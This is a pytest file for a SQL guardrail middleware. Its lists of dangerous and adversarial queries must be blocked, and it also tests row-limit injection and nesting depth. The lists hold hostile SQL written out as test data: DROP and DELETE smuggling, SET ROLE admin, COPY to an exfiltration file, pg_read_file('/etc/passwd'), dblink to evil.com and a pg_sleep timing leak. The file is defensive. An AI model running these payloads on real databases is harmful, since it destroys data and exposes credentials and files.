"""Offline unit tests for the guardrail middleware. No DB connection needed —
these operate purely on SQL text via sqlglot, same as before the Postgres
migration. Live-execution tests (against a real Postgres) live in
tests/test_db/test_executor.py and are skipped when no database is reachable.
"""
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import pytest

from app.guardrails import sql_validator as guardrails
from app.config import settings


DANGEROUS = [
    "DROP TABLE customers",
    "DELETE FROM orders",
    "UPDATE products SET unit_price = 0",
    "INSERT INTO customers VALUES (1,'a','b','c','d','2025-01-01')",
    "CREATE TABLE t AS SELECT 1",
    "ALTER TABLE customers ADD COLUMN hacked INT",
    "TRUNCATE customers",
    "SELECT 1; DROP TABLE customers",
]

# Adversarial patterns: smuggling, obfuscation, hidden writes, admin/exfil, info leak,
# and Postgres-specific role/session hijacking that would defeat RLS session wiring.
ADVERSARIAL = [
    # multi-statement smuggling (incl. trailing-comment variants)
    "SELECT * FROM customers WHERE name = 'x'; DELETE FROM orders; --",
    "SELECT a FROM t UNION ALL SELECT b FROM u; DROP TABLE customers",
    # comment-inside-keyword and case obfuscation
    "DROP/*x*/TABLE customers",
    "DrOp TaBlE customers",
    # write hidden inside a CTE
    "WITH x AS (DELETE FROM orders RETURNING *) SELECT * FROM x",
    # admin / session / config commands
    "SET ROLE admin",
    "SET SESSION AUTHORIZATION admin",
    "GRANT SELECT ON customers TO PUBLIC",
    "COPY customers TO '/tmp/exfil.csv'",
    "VACUUM customers",
    # information disclosure / superuser file access
    "SELECT pg_read_file('/etc/passwd')",
    "SELECT * FROM pg_ls_dir('.')",
    "SELECT lo_export(12345, '/tmp/blob')",
    "SELECT current_setting('some.secret')",
    "SELECT dblink('host=evil.com', 'SELECT 1')",
    # timing side-channel / resource exhaustion
    "SELECT pg_sleep(CASE WHEN (SELECT secret FROM users LIMIT 1)='x' THEN 5 ELSE 0 END)",
    "SELECT pg_sleep_for('5 seconds')",
    "SELECT pg_notify('channel', 'payload')",
    "SELECT dblink_send_query('host=evil.com', 'SELECT 1')",
]


@pytest.mark.parametrize("sql", DANGEROUS)
def test_dangerous_sql_blocked(sql):
    result = guardrails.check(sql)
    assert not result.allowed, f"should have blocked: {sql}"
    assert result.violations


@pytest.mark.parametrize("sql", ADVERSARIAL)
def test_adversarial_sql_blocked(sql):
    result = guardrails.check(sql)
    assert not result.allowed, f"adversarial input slipped through: {sql}"
    assert result.violations


def test_comment_smuggled_drop_is_inert_not_executed():
    """A DROP after a comment marker is parsed as an inert comment, not a second
    statement — allowed, but the DROP is a comment node and never a statement."""
    import sqlglot
    from sqlglot import exp

    result = guardrails.check("SELECT * FROM customers -- ; DROP TABLE customers")
    assert result.allowed
    statements = sqlglot.parse(result.sql, read=guardrails.SQL_DIALECT)
    assert len(statements) == 1
    assert isinstance(statements[0], exp.Select)
    assert statements[0].find(exp.Drop) is None  # DROP survives only as a comment


def test_plain_select_allowed():
    result = guardrails.check("SELECT * FROM customers WHERE country = 'India'")
    assert result.allowed


def test_limit_injected():
    result = guardrails.check("SELECT * FROM orders")
    assert result.allowed
    assert f"LIMIT {settings.guardrails.default_row_limit}" in result.sql
    assert any("injected" in n for n in result.notes)


def test_existing_small_limit_kept():
    result = guardrails.check("SELECT * FROM orders LIMIT 5")
    assert result.allowed
    assert "LIMIT 5" in result.sql
    assert not result.notes


def test_oversized_limit_clamped():
    result = guardrails.check("SELECT * FROM orders LIMIT 999999")
    assert result.allowed
    assert f"LIMIT {settings.guardrails.default_row_limit}" in result.sql


def test_cte_allowed():
    sql = ("WITH r AS (SELECT order_id, SUM(quantity) q FROM order_items GROUP BY order_id) "
           "SELECT AVG(q) FROM r")
    result = guardrails.check(sql)
    assert result.allowed, result.violations


def test_union_allowed():
    result = guardrails.check("SELECT name FROM customers UNION SELECT name FROM products")
    assert result.allowed, result.violations


def test_depth_limit():
    sql = "SELECT * FROM (SELECT * FROM (SELECT * FROM (SELECT * FROM customers) a) b) c"
    result = guardrails.check(sql)
    assert not result.allowed
    assert any("depth" in v.lower() for v in result.violations)


def test_depth_three_allowed():
    sql = "SELECT * FROM (SELECT * FROM (SELECT * FROM customers) a) b"
    result = guardrails.check(sql)
    assert result.allowed, result.violations


def test_garbage_rejected():
    result = guardrails.check("this is not sql at all ;;;")
    assert not result.allowed
